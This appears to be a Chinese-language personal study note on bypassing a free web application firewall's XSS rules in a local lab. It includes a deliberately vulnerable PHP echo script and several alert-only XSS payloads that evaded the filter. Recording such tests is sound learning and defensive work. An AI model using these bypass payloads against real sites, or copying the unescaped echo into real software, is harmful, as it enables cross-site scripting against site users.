  最近在学习xss方面的知识，涉及到waf的测试，在这里做个记录，方面查阅。

  ### 0x00 搭建环境
  - - -
  本地搭建测试waf测试，xss相关防护规则全部开启。
  
 ![1](https://ws1.sinaimg.cn/large/005DAKuvgy1g1sv90art7j30l10c0myc.jpg)
 
  ### 0x01 Self-Xss绕过
  - - -

  测试脚本
  ```php
  <?php   
    $input = @$_REQUEST["xss"];
    echo "<div>".$input."</div>"
  ?>
  ```
  
  首先思路就是一些被waf**遗漏的标签**，暂时不考虑**编码**或者**拼接字符串**这类思路，我们直接拿来测试。   

  `<video src=1 onerror=alert(/xss/)>`绕过。
  
  ![2](https://ws1.sinaimg.cn/large/005DAKuvgy1g1tv4ytym1j30uj08lq3m.jpg)
  
  类似的标签还有`<audio src=x onerror=alert(/xss/)>`
  
  ![3](https://ws1.sinaimg.cn/large/005DAKuvgy1g1tv87ifeuj30uj0933z8.jpg)
  
  除此之外以下几个`payload`都可以绕过。
  ```javascript
  <body/onfocus=alert(/xss/)>
  <details open ontoggle=alert(/xss/)>
  <button onfocus=alert(/xss/) autofocus>
  
  ```
  利用**伪协议**
  
  waf拦截
  
  ![4](https://ws1.sinaimg.cn/large/005DAKuvgy1g1tvkcpm4uj30uj08174y.jpg)
  
  加上一个**xmlns属性**即可绕过
  
  ![5](https://ws1.sinaimg.cn/large/005DAKuvgy1g1tvojz1hmj30uj08kdgj.jpg)
  
  实际上，我测试的waf是免费使用的，所以有些厂商可以象征性的取一些样本，拦截一下常见的标签，如果你购买了厂商的高级服务，那我们绕过就有难度，然而大多数网站还是使用免费版的多，我也不可能为了测试去购买高级服务吧。
  
  
  
